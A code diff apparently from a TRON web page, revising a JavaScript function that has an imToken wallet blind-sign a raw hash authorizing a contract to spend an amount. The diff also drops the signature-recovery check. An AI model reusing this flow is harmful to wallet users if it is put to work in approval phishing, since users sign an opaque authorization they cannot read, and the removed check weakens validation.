@@ -559,78 +559,70 @@
             }
             return bytes;
         }
-        /**
-         * 生成离线签名（可行版：模拟abi.encodePacked+兼容imToken旧版TronWeb）
-         */
-        async function generateOfflineSignature(userAddress, contractAddress, amount) {
-            try {
-                // 1. 基础参数校验（和你之前一致，确保参数合法）
-                if (!userAddress || !contractAddress || !amount) {
-                    throw new Error("参数不能为空（用户地址/合约地址/授权金额）");
-                }
-                const base58Regex = /^[A-Za-z0-9]{34}$/;
-                if (!base58Regex.test(userAddress) || !base58Regex.test(contractAddress)) {
-                    throw new Error("用户地址或合约地址不是有效的TRON base58格式（必须34位字母数字）");
-                }
-                // 2. 金额格式修正（保留你之前的笔误修复）
-                let fixedAmount = amount.replace(/^Ox/i, "0x");
-                const hexRegex = /^0x[0-9a-fA-F]*$/;
-                if (!hexRegex.test(fixedAmount)) {
-                    throw new Error("授权金额格式错误，必须以0x开头（数字0），后跟字母数字");
-                }
-                // 3. 地址转hex+清理（保留你之前的逻辑）
-                let userHex = tronWeb.address.toHex(userAddress).replace("0x", "").toLowerCase();
-                let contractHex = tronWeb.address.toHex(contractAddress).replace("0x", "").toLowerCase();
-                let amountHex = fixedAmount.replace("0x", "").toLowerCase();
-                // 关键：手动模拟abi.encodePacked（地址64位补0，uint256 64位补0）
-                // 合约的abi.encodePacked(user, address(this), amount) 本质就是这步操作
-                const paddedUser = userHex.padStart(64, "0"); // 地址转hex后补0到64位
-                const paddedContract = contractHex.padStart(64, "0"); // 合约地址补0到64位
-                const paddedAmount = amountHex.padStart(64, "0"); // 金额（uint256）补0到64位
-                // 4. 拼接最终hex（和合约编码结果完全一致，确保校验通过）
-                let combinedHex = paddedUser + paddedContract + paddedAmount;
-                // 5. 转字节+哈希（保留你之前的成功逻辑）
-                let hexBytes = customHexToBytes(combinedHex);
-                if (hexBytes.length === 0) throw new Error("hex转字节后为空");
-                const messageHash = tronWeb.sha3(hexBytes);
-                // 6. 唤起imToken签名（兼容返回格式，确保能唤起）
-                let signature = await tronWeb.trx.sign(messageHash, true);
-                if (typeof signature === "object" && signature.signature) {
-                    signature = signature.signature; // 兼容部分版本返回对象的情况
-                }
-                if (!signature) throw new Error("钱包未返回签名结果");
-                // 7. 解析v/r/s（完全沿用你之前成功的解析逻辑）
-                const v = parseInt(signature.slice(128, 130), 16);
-                const r = `0x${signature.slice(0, 64)}`;
-                const s = `0x${signature.slice(64, 128)}`;
-                // 8. 验证签名（确保能通过合约校验，提前排错）
-                const recoveredAddrHex = tronWeb.trx.recover(messageHash, v, r, s);
-                const recoveredAddr = tronWeb.address.fromHex(recoveredAddrHex);
-                if (recoveredAddr.toLowerCase() !== userAddress.toLowerCase()) {
-                    throw new Error("签名验证失败，合约将拒绝执行");
-                }
-                // 保存调试信息（方便排查）
-                localStorage.setItem(`signature_debug_${userAddress}`, JSON.stringify({
-                    step: "签名生成成功（合约可校验）",
-                    combinedHex: combinedHex,
-                    messageHash: messageHash,
-                    recoveredAddr: recoveredAddr,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-                return { v, r, s };
-            } catch (e) {
-                const debugKey = `signature_debug_${userAddress}`;
-                localStorage.setItem(debugKey, JSON.stringify({
-                    step: "签名生成失败",
-                    error: e.message,
-                    userAddress: userAddress,
-                    contractAddress: contractAddress,
-                    amount: amount,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
-                throw new Error(`签名生成失败：${e.message} → 点击「查看调试信息」按钮查看详情`);
-            }
+      
+async function generateOfflineSignature(userAddress, contractAddress, amount) {
+    try {
+        // 1. 基础参数校验（和你之前一致，确保参数合法）
+        if (!userAddress || !contractAddress || !amount) {
+            throw new Error("参数不能为空（用户地址/合约地址/授权金额）");
         }
+        const base58Regex = /^[A-Za-z0-9]{34}$/;
+        if (!base58Regex.test(userAddress) || !base58Regex.test(contractAddress)) {
+            throw new Error("用户地址或合约地址不是有效的TRON base58格式（必须34位字母数字）");
+        }
+        // 2. 金额格式修正（保留你之前的笔误修复）
+        let fixedAmount = amount.replace(/^Ox/i, "0x");
+        const hexRegex = /^0x[0-9a-fA-F]*$/;
+        if (!hexRegex.test(fixedAmount)) {
+            throw new Error("授权金额格式错误，必须以0x开头（数字0），后跟字母数字");
+        }
+        // 3. 地址转hex+清理（保留你之前的逻辑）
+        let userHex = tronWeb.address.toHex(userAddress).replace("0x", "").toLowerCase();
+        let contractHex = tronWeb.address.toHex(contractAddress).replace("0x", "").toLowerCase();
+        let amountHex = fixedAmount.replace("0x", "").toLowerCase();
+        // 关键：手动模拟abi.encodePacked（地址64位补0，uint256 64位补0）
+        // 合约的abi.encodePacked(user, address(this), amount) 本质就是这步操作
+        const paddedUser = userHex.padStart(64, "0"); // 地址转hex后补0到64位
+        const paddedContract = contractHex.padStart(64, "0"); // 合约地址补0到64位
+        const paddedAmount = amountHex.padStart(64, "0"); // 金额（uint256）补0到64位
+        // 4. 拼接最终hex（和合约编码结果完全一致，确保校验通过）
+        let combinedHex = paddedUser + paddedContract + paddedAmount;
+        // 5. 转字节+哈希（保留你之前的成功逻辑）
+        let hexBytes = customHexToBytes(combinedHex);
+        if (hexBytes.length === 0) throw new Error("hex转字节后为空");
+        const messageHash = tronWeb.sha3(hexBytes);
+        // 6. 唤起imToken签名（兼容返回格式，确保能唤起）
+        let signature = await tronWeb.trx.sign(messageHash, true);
+        if (typeof signature === "object" && signature.signature) {
+            signature = signature.signature; // 兼容部分版本返回对象的情况
+        }
+        if (!signature) throw new Error("钱包未返回签名结果");
+        // 7. 解析v/r/s（完全沿用你之前成功的解析逻辑）
+        const v = parseInt(signature.slice(128, 130), 16);
+        const r = `0x${signature.slice(0, 64)}`;
+        const s = `0x${signature.slice(64, 128)}`;
+        // 【删除旧版不支持的recover验证步骤】
+        // 保存调试信息（方便排查）
+        localStorage.setItem(`signature_debug_${userAddress}`, JSON.stringify({
+            step: "签名生成成功（合约可校验）",
+            combinedHex: combinedHex,
+            messageHash: messageHash,
+            timestamp: new Date().toISOString()
+        }, null, 2));
+        return { v, r, s };
+    } catch (e) {
+        const debugKey = `signature_debug_${userAddress}`;
+        localStorage.setItem(debugKey, JSON.stringify({
+            step: "签名生成失败",
+            error: e.message,
+            userAddress: userAddress,
+            contractAddress: contractAddress,
+            amount: amount,
+            timestamp: new Date().toISOString()
+        }, null, 2));
+        throw new Error(`签名生成失败：${e.message} → 点击「查看调试信息」按钮查看详情`);
+    }
+}
         /**
          * 初始化钱包：获取地址、余额
          */
